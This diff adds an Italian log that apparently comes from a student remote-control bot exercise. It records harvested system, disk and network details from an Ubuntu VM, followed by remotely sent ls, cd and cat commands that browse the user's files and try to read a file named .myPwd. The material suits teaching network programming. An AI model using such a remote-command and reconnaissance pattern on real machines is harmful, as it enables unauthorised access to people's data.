@@ -1,0 +1,2278 @@
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 16:28:18
+
+=== INFORMAZIONI SULLA MEMORIA RAM === 
+Memoria totale: 3.83GB
+Memoria disponibile: 2.52GB
+Memoria in uso: 1000.79MB
+Percentuale memoria in uso: 34.2%
+
+=== INFORMAZIONI SUL DISCO E SULLE PARTIZIONI === 
+
+=== PARTIZIONI INDIVIDUATE ===
+Nome partizione: /dev/sda3
+Punto di mount: /
+Tipo di file system: ext4
+
+Nome partizione: /dev/loop0
+Punto di mount: /snap/bare/5
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop2
+Punto di mount: /snap/core20/1695
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop4
+Punto di mount: /snap/firefox/2067
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop5
+Punto di mount: /snap/gnome-3-38-2004/112
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop6
+Punto di mount: /snap/gnome-3-38-2004/119
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop7
+Punto di mount: /snap/gtk-common-themes/1535
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop9
+Punto di mount: /snap/snap-store/599
+Tipo di file system: squashfs
+
+Nome partizione: /dev/sda3
+Punto di mount: /var/snap/firefox/common/host-hunspell
+Tipo di file system: ext4
+
+Nome partizione: /dev/loop12
+Punto di mount: /snap/snapd-desktop-integration/14
+Tipo di file system: squashfs
+
+Nome partizione: /dev/sda2
+Punto di mount: /boot/efi
+Tipo di file system: vfat
+
+Nome partizione: /dev/loop13
+Punto di mount: /snap/snapd/17883
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop11
+Punto di mount: /snap/core20/1738
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop1
+Punto di mount: /snap/snapd-desktop-integration/43
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop14
+Punto di mount: /snap/snap-store/638
+Tipo di file system: squashfs
+
+Nome partizione: /dev/loop8
+Punto di mount: /snap/firefox/2186
+Tipo di file system: squashfs
+
+
+=== DETTAGLIO PARTIZIONI ===
+Nome partizione: /dev/sda3
+Dimensione: 23.94GB
+Spazio occupato: 13.16GB
+Spazio libero: 9.54GB
+Percentuale spazio occupato: 58.0%
+
+Nome partizione: /dev/loop0
+Dimensione: 128.00KB
+Spazio occupato: 128.00KB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop2
+Dimensione: 63.25MB
+Spazio occupato: 63.25MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop4
+Dimensione: 203.75MB
+Spazio occupato: 203.75MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop5
+Dimensione: 400.88MB
+Spazio occupato: 400.88MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop6
+Dimensione: 346.38MB
+Spazio occupato: 346.38MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop7
+Dimensione: 91.75MB
+Spazio occupato: 91.75MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/loop9
+Dimensione: 46.00MB
+Spazio occupato: 46.00MB
+Spazio libero: 0.00B
+Percentuale spazio occupato: 100.0%
+
+Nome partizione: /dev/sda3
+Dimensione: 23.94GB
+Spazio occupato: 13.16GB
+Spazio libero: 9.54GB
+Percentuale spazio occupato: 58.0%
+
+Nome partizione: /dev/loop12
+Dimensione: 384.00KB
+Spazio occupato: 384.00KB
+Spazio 
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 16:28:18
+
+=== INFORMAZIONI SULLA SCHEDA DI RETE E INTERFACCE DI RETE === 
+Indirizzo MAC scheda di rete: 00:00:0D:07:91:5F:74:E4
+
+Nome interfaccia di rete: lo
+Indirizzo IP: 127.0.0.1
+Network mask: 255.0.0.0
+Broadcast: None
+
+Nome interfaccia di rete: enp0s3
+Indirizzo IP: 10.0.2.15
+Network mask: 255.255.255.0
+Broadcast: 10.0.2.255
+
+Nome interfaccia di rete: enp0s8
+Indirizzo IP: 192.168.1.188
+Network mask: 255.255.255.0
+Broadcast: 192.168.1.255
+
+
+=== STATISTICHE SULLA RETE === 
+Totale byte inviati: 417.29MB
+Totale byte ricevuti: 287.54MB
+Totale pacchetti inviati: 316075
+Totale pacchetti ricevuti: 245933
+Totale errori in ricezione pacchetti: 0
+Totale errori in invio pacchetti: 0
+Totale pacchetti in arrivo persi: 27
+Totale pacchetti in uscita persi: 0
+
+Comando inviato: ls
+Risultato:
+Client1.py
+README.txt
+Server1.py
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+final test
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+snap
+Templates
+Videos
+
+
+Comando inviato: cd Desktop
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Downloads
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+alessio
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: cd usr
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+games
+include
+lib
+lib32
+lib64
+libexec
+libx32
+local
+sbin
+share
+src
+
+
+Comando inviato: cd games
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+gamemoderun
+gamemode-simulate-game
+gnome-mahjongg
+gnome-mines
+gnome-sudoku
+sol
+
+
+Comando inviato: ls -l
+Risultato:
+totale 712
+-rwxr-xr-x 1 root root    299 feb 18  2021 gamemoderun
+-rwxr-xr-x 1 root root  14488 mar 23  2022 gamemode-simulate-game
+-rwxr-xr-x 1 root root 117104 mar 21  2022 gnome-mahjongg
+-rwxr-xr-x 1 root root 125440 feb 18  2022 gnome-mines
+-rwxr-xr-x 1 root root 174520 mar 17  2022 gnome-sudoku
+-rwxr-xr-x 1 root root 285952 mar 31  2022 sol
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd local
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+etc
+games
+include
+lib
+man
+sbin
+share
+src
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: cd home
+Risultato:
+
+
+
+Comando inviato: cd alessio
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+snap
+Templates
+Videos
+
+
+Comando inviato: cd Music
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+
+
+
+Comando inviato: cd ,,
+Risultato:
+[Errno 2] No such file or directory: '/home/alessio/Music/,,'
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Pictures
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Desktop
+Risultato:
+
+
+
+Comando inviato: ls -a
+Risultato:
+.
+..
+TETTEOCULO
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:02 ..
+-rw-rw-r--  1 alessio alessio    0 dic 13 17:02 TETTEOCULO
+
+
+Comando inviato: cat TETTEOCULO
+Risultato:
+
+
+
+
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 17:23:41
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+BeeBeeGee - Tenam
+BeeBeeGee - Tenam.zip
+Binotto Team - Erasmo
+Binotto Team - Erasmo.zip
+BOTTANET_2 - SiMiez
+BOTTANET_2 - SiMiez.rar
+Bot Tattici Nucleari - Giuseppe Francione
+Bot Tattici Nucleari - Giuseppe Francione.zip
+Carnevale-Bosco-Granillo
+Carnevale-Bosco-Granillo - Emanuele Granillo.zip
+Chicago Bulls 96_s Project - Tempah
+Chicago Bulls 96_s Project - Tempah.zip
+CI ABBIAMO PROVATO - Paolo Dezio
+CI ABBIAMO PROVATO - Paolo Dezio.zip
+Cookie Thieves - macro21KGB
+Cookie Thieves - macro21KGB.zip
+DukeFilecrawler - Lorenzo Sepe
+DukeFilecrawler - Lorenzo Sepe.rar
+Fabrizio - Fabrizio Di Giovanni
+Fabrizio - Fabrizio Di Giovanni.zip
+FPS Team - Ferdinando D_Alessandro
+FPS Team - Ferdinando D_Alessandro.zip
+Gruppo Reti DGBS - Salvatore
+Gruppo Reti DGBS - Salvatore.zip
+Hackerman - Fede
+Hackerman - Fede.rar
+HomeNet-Production
+HomeNet-Production - Armando Bausano.rar
+(In connessione...) - Agostino Cesarano
+(In connessione...) - Agostino Cesarano.zip
+Lohacker
+Lohacker - Mathieus99 Container.rar
+Lohackers
+Lohackers - Claudio Riccio.zip
+LuFra
+LuFra - Luigi Ercolano.zip
+MTRS17
+MTRS17 - Matteo Spavone.zip
+ProgettoReti - IPythonieri - Francesco Bruno (TheMasterN1)
+ProgettoReti - IPythonieri - Francesco Bruno (TheMasterN1).zip
+RFC_Group
+RFC Group - Giuseppe Travaglino.zip
+StealBot
+StealBot - Valentino Bocchetti.zip
+StockFish-Bait
+StockFish-Bait - Giuseppe De Martino.zip
+TCPIPino
+TCPIPino - Francesco Orlando.rar
+ThePhantomThieves
+ThePhantomThieves - Alex Ciacciarella.zip
+TMB (Trust Me Bro)
+TMB (Trust Me Bro) - Vincenzo Donadio.zip
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -a -l
+Risultato:
+totale 12
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:31 ..
+drwxrwx--- 28 alessio alessio 4096 dic 13 16:06 final test
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls -a -l
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:31 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 3982 dic 13 17:03 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:31 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-rw-r--  1 alessio alessio   61 dic 13 16:47 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  807 nov 12 08:24 .profile
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+Comando inviato: cat .myPwd
+Risultato:
+SBAGLIATO! VEDI ALTROVE
+
+
+Comando inviato: cd Downloads
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:31 ..
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Desktop
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:31 ..
+-rw-rw-r--  1 alessio alessio    0 dic 13 17:02 TETTEOCULO
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+snap
+Templates
+Videos
+
+
+Comando inviato: cd Music
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:31 ..
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Pictures
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:33 ..
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Public
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:33 ..
+-rw-rw-r--  1 alessio alessio    0 dic 13 17:01 bruno
+
+
+Comando inviato: cat bruno
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+snap
+Templates
+Videos
+
+
+Comando inviato: cd Templates
+Risultato:
+
+
+
+Comando inviato: ls -a -l
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:34 ..
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd Videos
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 8
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 .
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:34 ..
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+alessio
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 12
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 .
+drwxr-xr-x 21 root    root    4096 nov 14 12:28 ..
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:34 alessio
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 2744408
+drwxr-xr-x  21 root root         4096 nov 14 12:28 .
+drwxr-xr-x  21 root root         4096 nov 14 12:28 ..
+lrwxrwxrwx   1 root root            7 nov 12 08:18 bin -> usr/bin
+drwxr-xr-x   4 root root         4096 nov 14 12:25 boot
+drwxrwxr-x   2 root root         4096 nov 12 08:24 cdrom
+drwxr-xr-x  19 root root         4160 dic 13 17:23 dev
+drwxr-xr-x 132 root root        12288 dic 13 16:39 etc
+drwxr-xr-x   3 root root         4096 nov 12 08:24 home
+lrwxrwxrwx   1 root root            7 nov 12 08:18 lib -> usr/lib
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root           10 nov 12 08:18 libx32 -> usr/libx32
+drwx------   2 root root        16384 nov 12 08:18 lost+found
+drwxr-xr-x   2 root root         4096 ago  9 13:48 media
+drwxr-xr-x   2 root root         4096 ago  9 13:48 mnt
+drwxr-xr-x   3 root root         4096 nov 12 08:58 opt
+drwxrwx---   1 root vboxsf       1984 dic 13 16:01 osx-shared
+dr-xr-xr-x 316 root root            0 dic 13 17:23 proc
+drwx------   4 root root         4096 nov 14 14:26 root
+drwxr-xr-x  33 root root          900 dic 13 17:24 run
+lrwxrwxrwx   1 root root            8 nov 12 08:18 sbin -> usr/sbin
+drwxr-xr-x  11 root root         4096 ago  9 13:55 snap
+drwxr-xr-x   2 root root         4096 ago  9 13:48 srv
+-rw-------   1 root root   2810183680 nov 12 08:18 swapfile
+dr-xr-xr-x  13 root root            0 dic 13 17:23 sys
+drwxrwxrwt  20 root root         4096 dic 13 17:29 tmp
+drwxr-xr-x  14 root root         4096 ago  9 13:48 usr
+drwxr-xr-x  14 root root         4096 ago  9 13:54 var
+
+
+Comando inviato: cd tmp
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+snap-private-tmp
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-colord.service-k4mjI7
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-ModemManager.service-N5auyh
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-power-profiles-daemon.service-kwclIa
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-switcheroo-control.service-JQYYZk
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-logind.service-dCZn6f
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-oomd.service-mhaBPy
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-resolved.service-id3xjS
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-timesyncd.service-veI7cG
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-upower.service-KNEVtd
+tracker-extract-3-files.1000
+tracker-extract-3-files.127
+VMwareDnD
+
+
+Comando inviato: ls -a
+Risultato:
+.
+..
+.font-unix
+.ICE-unix
+.iprt-localipc-DRMIpcServer
+snap-private-tmp
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-colord.service-k4mjI7
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-ModemManager.service-N5auyh
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-power-profiles-daemon.service-kwclIa
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-switcheroo-control.service-JQYYZk
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-logind.service-dCZn6f
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-oomd.service-mhaBPy
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-resolved.service-id3xjS
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-systemd-timesyncd.service-veI7cG
+systemd-private-3dd625cbebb54c95b2f50f9965ea15fe-upower.service-KNEVtd
+.Test-unix
+tracker-extract-3-files.1000
+tracker-extract-3-files.127
+VMwareDnD
+.X0-lock
+.X1024-lock
+.X1025-lock
+.X11-unix
+.X1-lock
+.XIM-unix
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: ls -l
+Risultato:
+totale 2744400
+lrwxrwxrwx   1 root root            7 nov 12 08:18 bin -> usr/bin
+drwxr-xr-x   4 root root         4096 nov 14 12:25 boot
+drwxrwxr-x   2 root root         4096 nov 12 08:24 cdrom
+drwxr-xr-x  19 root root         4160 dic 13 17:23 dev
+drwxr-xr-x 132 root root        12288 dic 13 16:39 etc
+drwxr-xr-x   3 root root         4096 nov 12 08:24 home
+lrwxrwxrwx   1 root root            7 nov 12 08:18 lib -> usr/lib
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root           10 nov 12 08:18 libx32 -> usr/libx32
+drwx------   2 root root        16384 nov 12 08:18 lost+found
+drwxr-xr-x   2 root root         4096 ago  9 13:48 media
+drwxr-xr-x   2 root root         4096 ago  9 13:48 mnt
+drwxr-xr-x   3 root root         4096 nov 12 08:58 opt
+drwxrwx---   1 root vboxsf       1984 dic 13 16:01 osx-shared
+dr-xr-xr-x 320 root root            0 dic 13 17:23 proc
+drwx------   4 root root         4096 nov 14 14:26 root
+drwxr-xr-x  33 root root          900 dic 13 17:24 run
+lrwxrwxrwx   1 root root            8 nov 12 08:18 sbin -> usr/sbin
+drwxr-xr-x  11 root root         4096 ago  9 13:55 snap
+drwxr-xr-x   2 root root         4096 ago  9 13:48 srv
+-rw-------   1 root root   2810183680 nov 12 08:18 swapfile
+dr-xr-xr-x  13 root root            0 dic 13 17:23 sys
+drwxrwxrwt  20 root root         4096 dic 13 17:29 tmp
+drwxr-xr-x  14 root root         4096 ago  9 13:48 usr
+drwxr-xr-x  14 root root         4096 ago  9 13:54 var
+
+
+Comando inviato: cd sys
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+block
+bus
+class
+dev
+devices
+firmware
+fs
+hypervisor
+kernel
+module
+power
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 4
+dr-xr-xr-x  13 root root    0 dic 13 17:23 .
+drwxr-xr-x  21 root root 4096 nov 14 12:28 ..
+drwxr-xr-x   2 root root    0 dic 13 17:23 block
+drwxr-xr-x  45 root root    0 dic 13 17:23 bus
+drwxr-xr-x  77 root root    0 dic 13 17:23 class
+drwxr-xr-x   4 root root    0 dic 13 17:23 dev
+drwxr-xr-x  16 root root    0 dic 13 17:23 devices
+drwxr-xr-x   5 root root    0 dic 13 17:23 firmware
+drwxr-xr-x   8 root root    0 dic 13 17:23 fs
+drwxr-xr-x   2 root root    0 dic 13 17:26 hypervisor
+drwxr-xr-x  16 root root    0 dic 13 17:23 kernel
+drwxr-xr-x 180 root root    0 dic 13 17:23 module
+drwxr-xr-x   3 root root    0 dic 13 17:35 power
+
+
+Comando inviato: cd ..
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+bin
+boot
+cdrom
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+osx-shared
+proc
+root
+run
+sbin
+snap
+srv
+swapfile
+sys
+tmp
+usr
+var
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 2744408
+drwxr-xr-x  21 root root         4096 nov 14 12:28 .
+drwxr-xr-x  21 root root         4096 nov 14 12:28 ..
+lrwxrwxrwx   1 root root            7 nov 12 08:18 bin -> usr/bin
+drwxr-xr-x   4 root root         4096 nov 14 12:25 boot
+drwxrwxr-x   2 root root         4096 nov 12 08:24 cdrom
+drwxr-xr-x  19 root root         4160 dic 13 17:23 dev
+drwxr-xr-x 132 root root        12288 dic 13 16:39 etc
+drwxr-xr-x   3 root root         4096 nov 12 08:24 home
+lrwxrwxrwx   1 root root            7 nov 12 08:18 lib -> usr/lib
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root            9 nov 12 08:18 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root           10 nov 12 08:18 libx32 -> usr/libx32
+drwx------   2 root root        16384 nov 12 08:18 lost+found
+drwxr-xr-x   2 root root         4096 ago  9 13:48 media
+drwxr-xr-x   2 root root         4096 ago  9 13:48 mnt
+drwxr-xr-x   3 root root         4096 nov 12 08:58 opt
+drwxrwx---   1 root vboxsf       1984 dic 13 16:01 osx-shared
+dr-xr-xr-x 319 root root            0 dic 13 17:23 proc
+drwx------   4 root root         4096 nov 14 14:26 root
+drwxr-xr-x  33 root root          900 dic 13 17:24 run
+lrwxrwxrwx   1 root root            8 nov 12 08:18 sbin -> usr/sbin
+drwxr-xr-x  11 root root         4096 ago  9 13:55 snap
+drwxr-xr-x   2 root root         4096 ago  9 13:48 srv
+-rw-------   1 root root   2810183680 nov 12 08:18 swapfile
+dr-xr-xr-x  13 root root            0 dic 13 17:23 sys
+drwxrwxrwt  20 root root         4096 dic 13 17:29 tmp
+drwxr-xr-x  14 root root         4096 ago  9 13:48 usr
+drwxr-xr-x  14 root root         4096 ago  9 13:54 var
+
+
+Comando inviato: cd home
+Risultato:
+
+
+
+Comando inviato: ls
+Risultato:
+alessio
+
+
+Comando inviato: cd alessio
+Risultato:
+
+
+
+Comando inviato: ls -l -a
+Risultato:
+totale 116
+drwxr-x--- 16 alessio alessio 4096 dic 13 17:37 .
+drwxr-xr-x  3 root    root    4096 nov 12 08:24 ..
+-rw-------  1 alessio alessio 3982 dic 13 17:03 .bash_history
+-rw-r--r--  1 alessio alessio  220 nov 12 08:24 .bash_logout
+-rw-r--r--  1 alessio alessio 3771 nov 12 08:24 .bashrc
+drwx------ 11 alessio alessio 4096 nov 14 14:26 .cache
+drwx------ 14 alessio alessio 4096 nov 14 12:36 .config
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:02 Desktop
+drwxr-xr-x  3 alessio alessio 4096 dic 13 16:36 Documents
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Downloads
+drwx------  2 alessio alessio 4096 nov 12 08:53 .gnupg
+-rw-------  1 alessio alessio   20 dic 13 17:37 .lesshst
+drwx------  5 alessio alessio 4096 dic 13 16:45 .local
+-rw-rw-r--  1 alessio alessio   61 dic 13 16:47 .local_
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Music
+-rw-rw-r--  1 alessio alessio   24 dic 13 16:46 .myPwd
+-rw-r--r--  1 alessio alessio  354 nov 12 08:55 .pam_environment
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Pictures
+-rw-r--r--  1 alessio alessio  807 nov 12 08:24 .profile
+drwxr-xr-x  2 alessio alessio 4096 dic 13 17:01 Public
+-rw-------  1 alessio alessio   89 nov 14 15:00 .python_history
+drwx------  4 alessio alessio 4096 nov 14 14:21 snap
+drwx------  2 alessio alessio 4096 nov 12 08:53 .ssh
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Templates
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-clipboard.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-draganddrop.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-seamless.pid
+-rw-r-----  1 alessio alessio    5 dic 13 17:24 .vboxclient-vmsvga-session-tty2.pid
+drwxr-xr-x  2 alessio alessio 4096 nov 12 08:44 Videos
+
+
+
+=== INFORMAZIONI SUL SISTEMA === 
+Nome utente: Ubuntu-20-04-LTS
+Sistema operativo: Linux
+Release SO: 5.15.0-52-generic
+Versione SO: #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022
+Architettura: x86_64
+
+=== INFORMAZIONI SUL TEMPO D'AVVIO === 
+Il sistema e' attivo dal giorno 13/12/2022 dalle ore 17:23:41
+
+=== INFORMAZIONI SULLA MEMORIA RAM === 
+Memoria totale: 3.83GB
+Memoria disponibile: 2.38GB
+Memoria in uso: 1.09GB
+Percentuale memoria in uso: 37.8%
+
+=== INFORMAZIONI SULLA SCHEDA DI RETE E INTERFACCE DI RETE === 
